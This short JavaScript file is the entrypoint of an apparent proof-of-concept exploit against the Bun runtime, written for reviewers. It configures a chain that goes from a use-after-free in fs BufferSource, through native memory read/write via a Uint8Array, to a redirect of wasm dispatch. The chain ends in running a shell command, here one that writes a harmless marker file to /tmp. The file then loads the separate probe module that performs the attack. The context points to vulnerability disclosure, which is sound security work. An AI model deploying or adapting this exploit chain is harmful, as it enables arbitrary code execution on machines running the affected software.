// Minimal reviewer entrypoint for the strongest local no-FFI proof:
// fs BufferSource UAF -> real Uint8Array native R/W -> wasm dispatch redirect
// -> local marker command. This wrapper fixes the generic harness knobs to the
// successful conservative proof configuration.

import fs from "node:fs";

process.env.CROSS_MODULE = "1";
process.env.MARKER_IMPORT = "1";
process.env.COMMAND_IMPORT = "1";
process.env.FAKE_DESCRIPTOR = "1";
process.env.FAKE_DESCRIPTOR_MODE = "replacement";
process.env.EXTRA_CELL_FIELDS = "40";
process.env.REAL_TYPEDARRAY_ARW = "1";
process.env.REAL_ARW_VIEW_SIZE = "128";
process.env.MARKER_PATH ||= "/tmp/bun_uaf_noffi_wasm_marker";
process.env.COMMAND_MARKER_PATH ||= "/tmp/bun_uaf_noffi_command_marker";
process.env.MARKER_COMMAND ||= `printf 'minimal-real-typedarray-arw-command:%s\\n' "${process.pid}" > ${process.env.COMMAND_MARKER_PATH}`;

try { fs.unlinkSync(process.env.MARKER_PATH); } catch {}
try { fs.unlinkSync(process.env.COMMAND_MARKER_PATH); } catch {}

await import("./wasm-export-code-pointer-redirect-probe.js");
